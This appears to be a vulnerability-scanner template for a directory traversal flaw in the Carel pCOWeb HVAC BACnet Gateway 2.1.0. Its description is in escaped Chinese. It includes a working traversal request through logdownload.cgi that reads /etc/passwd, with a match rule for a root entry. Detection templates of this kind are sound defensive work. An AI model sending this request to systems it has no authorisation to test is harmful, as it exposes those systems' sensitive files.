expression: r0()
id: carel-pcoweb-hvac-bacnet-gateway-directory-traversal
info:
  author: LiquidWorm
  description: "\u8BBE\u5907\u5B58\u5728\u672A\u7ECF\u9A8C\u8BC1\u7684\u4EFB\u610F\
    \u6587\u4EF6\u6CC4\u6F0F\u6F0F\u6D1E.\u8F93\u5165\u901A\u8FC7\u201Cfile\u201D\
    GET\u53C2\u6570\u901A\u8FC7\u201Clogdownload\u201D\u4F20\u9012\u3002cgi'Bash\u811A\
    \u672C\u5728\u7528\u4E8E\u4E0B\u8F7D\u65E5\u5FD7\u6587\u4EF6\u4E4B\u524D\u672A\
    \u6B63\u786E\u9A8C\u8BC1\u3002\u8FD9\u53EF\u4EE5\u88AB\u5229\u7528\u901A\u8FC7\
    \u76EE\u5F55\u904D\u5386\u653B\u51FB\u6CC4\u9732\u4EFB\u610F\u548C\u654F\u611F\
    \u6587\u4EF6\u7684\u5185\u5BB9\u3002"
  name: "Carel pCOWeb HVAC BACnet Gateway 2.1.0-\u76EE\u5F55\u904D\u5386"
  reference:
  - https://www.exploit-db.com/exploits/50986
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd
